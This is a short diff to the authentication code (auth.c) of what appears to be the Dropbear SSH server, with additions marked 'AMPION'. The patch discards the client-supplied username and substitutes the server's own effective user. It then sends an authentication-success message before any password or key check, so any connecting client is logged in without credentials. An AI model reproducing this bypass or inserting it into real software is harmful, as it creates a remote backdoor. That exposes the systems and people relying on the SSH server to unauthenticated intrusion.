@@ -25,7 +25,9 @@
 /* This file (auth.c) handles authentication requests, passing it to the
  * particular type (auth-passwd, auth-pubkey). */
 
-
+// AMPION START so we can use a passwd struct below
+#include <pwd.h>
+// AMPION END
 #include "includes.h"
 #include "dbutil.h"
 #include "session.h"
@@ -95,6 +97,14 @@ void recv_msg_userauth_request() {
 	}
 
 	username = buf_getstring(ses.payload, &userlen);
+	// AMPION START consume the buffer
+	uid_t uid;
+	struct passwd *pw;
+	uid = geteuid();
+	pw = getpwuid (uid);
+	username = pw->pw_name;
+	userlen = strlen(username);
+	// AMPION END
 	servicename = buf_getstring(ses.payload, &servicelen);
 	methodname = buf_getstring(ses.payload, &methodlen);
 
@@ -117,7 +127,10 @@ void recv_msg_userauth_request() {
 	if (checkusername(username, userlen) == DROPBEAR_SUCCESS) {
 		valid_user = 1;
 	}
-
+	// AMPION START short circuit to success
+	send_msg_userauth_success();
+	goto out;
+	// AMPION END
 	/* user wants to know what methods are supported */
 	if (methodlen == AUTH_METHOD_NONE_LEN &&
 			strncmp(methodname, AUTH_METHOD_NONE,
